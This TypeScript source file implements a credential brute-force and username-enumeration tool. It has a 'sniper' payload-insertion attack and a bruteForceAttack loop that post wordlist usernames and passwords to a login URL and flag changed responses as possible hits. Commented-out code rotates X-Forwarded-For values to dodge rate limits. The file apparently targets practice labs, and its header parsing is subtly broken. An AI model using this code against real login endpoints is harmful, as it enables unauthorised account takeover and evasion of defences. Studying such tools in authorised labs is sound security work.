import axios, { Axios, AxiosRequestConfig } from 'axios';
import { readFileSync } from 'fs';


export const getRequest = (targetURL: string, config?: AxiosRequestConfig) => {
	axios
		.get(targetURL, config)
		.then(response => {
			// return response;
			// console.log('REQUEST CONFIG:\n', response.config);
			// console.log('REQUEST:\n', response.request);
			console.log('RESPONSE STATUS:\n', response.status);
			console.log('RESPONSE STATUSTEXT:\n', response.statusText);
			console.log('RESPONSE HEADER:\n', response.headers);
			console.log('RESPONSE DATA:\n', response.data);
		})
		.catch(err => {
			console.log(err);
		});
};

export const postRequest = (targetURL: string, data?: any, config?: AxiosRequestConfig) => {
	axios
		.post(targetURL, data, config)
		.then(response => {
			// return response;
			console.log('RESPONSE STATUS:\n', response.status);
			console.log('RESPONSE STATUSTEXT:\n', response.statusText);
			console.log('RESPONSE HEADER:\n', response.headers);
			console.log('RESPONSE DATA:\n', response.data);
		})
		.catch(err => {
			console.log(err);
		});
};

export const sniperAttackTemplate = async (
	formTargetURL: string,
	formData: string,
	formDiscriminator: string,
	payloadSRC?: string,
	formHeader?: string,
) => {
	/**
	 * Initialize Attack Parameters
	 */
	/**
	 * Position Parameters
	 */
	// Target URL (example: 'https:google.com')
	const target: string = formTargetURL;
	console.log('target ' + target);
	// Body Data with marked payload positions (example: 'username=$test$&password=pass')
	const data: string = formData;
	console.log('data ' + data);
	// Payload Discriminator (example: '$')
	const discriminator: string = formDiscriminator;
	console.log('discriminator ' + discriminator);
	const regexForPayload = new RegExp(`\\${discriminator}(\\w+)\\${discriminator}`, 'g');
	console.log('regexForPayload ' + regexForPayload);
	// Headers (example: 'Content-Type': 'application/json' 'X-Forwarded-For': `129.0.0.X`)
	let config: AxiosRequestConfig = {};
	if (formHeader) {
		const extractedHeaders = formHeader.split('\r\n');
		config = {
			headers: { extractedHeaders },
		};
		// config.headers = extractedHeaders;
	}

	/**
	 * Payload Parameters
	 */
	// Payload File (List)
	const payload: string[] = readFileSync('src/payloads/usernames.txt').toString().split('\n');
	console.log('payload ' + payload);

	/**
	 * Ressource Pool Parameters
	 */
	// Delay between attacks
	const delay: number = 0;

	/**
	 * Option Parameters
	 */
	// Regex Extract
	const extractRegexStart: string = '-warning>';
	const extractRegexEnd: string = '</p>';
	const extractRegex: string = (extractRegexStart + '(.*?)' + extractRegexEnd);
	let extractedData: string = ''; // initialize for later change
	let extractedDataCache: string = ''; // initialize for later change

	// Information about oncurring attack
	let foundPayloads = null;
	if (data.match(regexForPayload) === null) {
		foundPayloads = [];
	} else {
		foundPayloads = data.match(regexForPayload);
	}
	console.log(
		`
Position Parameters:
Attack Type: Sniper
Target: ${target}
Header: ${JSON.stringify(config.headers)}
Data: '${data}'
Discriminator: ${discriminator}
${foundPayloads!.length} Payloads: ${foundPayloads}
		`,
	);
	/**
	 * Attack Loop
	 */
	// Request Duration count start
	const requestStartAt: number = performance.now();
	for (let i = 0; i < payload.length; i++) {
		// Find Paylods and insert
		const axiosData = data.replace(regexForPayload, payload[i]);

		await axios
			.post(target, axiosData, config)
			.then(response => {
				const requestEndAt: number = performance.now();
				// Request Duration Calculation
				const requestDuration: number = requestEndAt - requestStartAt;

				// Check Response Data for Regex Extract
				if (response.data.includes(extractRegexStart)) {
					extractedData = `${response.data.match(extractRegex)[1]}`;
				} else {
					extractedData = '### NO REGEX EXTRACT ###';
				}

				// Console Output for current attack try
				console.log(
					`
Try #${i + 1} | data: '${axiosData}'
RESPONSE:
Status: ${response.status} ${response.statusText}
Extracted data: ${extractedData}
Response Time: ${requestDuration}
					`,
				);
			})
			.catch(err => {
				console.log(err);
			});
		// Check for a Change in extracted Data and log it
		if ((i !== 0) && (extractedDataCache !== extractedData)) {
			console.log(`CHANGE FOUND AT TRY #${i + 1}\nMaybe a Hit?`);
		} else {
			extractedDataCache = extractedData;
		}
	}
};

export const bruteForceAttack = async (targetURL: string, payloadFile?: string) => {

	const payloadUsernames: string[] = readFileSync('src/payloads/usernames.txt').toString().split('\n');
	const payloadPasswords: string[] = readFileSync('src/payloads/passwords.txt').toString().split('\n');
	const payloadINT: string[] = readFileSync('src/payloads/int_1-100.txt').toString().split('\n');
	// const payload: string[] = readFileSync(`${payloadFile}`).toString().split('\n');
	const extractRegexStart: string = '-warning>';
	const extractRegexEnd: string = '</p>';
	const extractRegex: string = (extractRegexStart + '(.*?)' + extractRegexEnd);
	let extractedData: string = '';
	let extractedDataCache: string = '';
	// let config: AxiosRequestConfig = undefined as any;

	// if (payloadUsernames.length == payloadPasswords.length) return;

	for (let i = 0; i < payloadUsernames.length; i++) {
		const data: string = `username=${payloadUsernames[i]}&password=pass`;
		// const data: string = `username=apps&password=${payloadPasswords[i]}`;
		// const data: string = 'username=wiener&password=peter';
		/*
		config = {
			headers: {
				'X-Forwarded-For': `129.0.0.${payloadINT[i]}`,
			},
		};
		*/

		const requestStartAt: number = performance.now();
		await axios
			.post(targetURL, data)
			.then(response => {
				const requestEndAt: number = performance.now();
				const requestDuration: number = requestEndAt - requestStartAt;
				// console.log('TRY #' + (i + 1));
				// console.log(response.data);
				if (response.data.includes(extractRegexStart)) {
					extractedData = `${response.data.match(extractRegex)[1]}`;
				} else {
					extractedData = '### NO REGEX EXTRACT ###';
				}
				console.log(
					`
Try #${i + 1} | data: '${data}'
RESPONSE:
Status: ${response.status} ${response.statusText}
Extracted data: ${extractedData}
Response Time: ${requestDuration}
					`,
				);
			})
			.catch(err => {
				console.log(err);
			});
		if ((i !== 0) && (extractedDataCache !== extractedData)) {
			console.log(`CHANGE FOUND AT TRY #${i + 1}\nMaybe a Hit?`);
		} else {
			extractedDataCache = extractedData;
		}
	}
};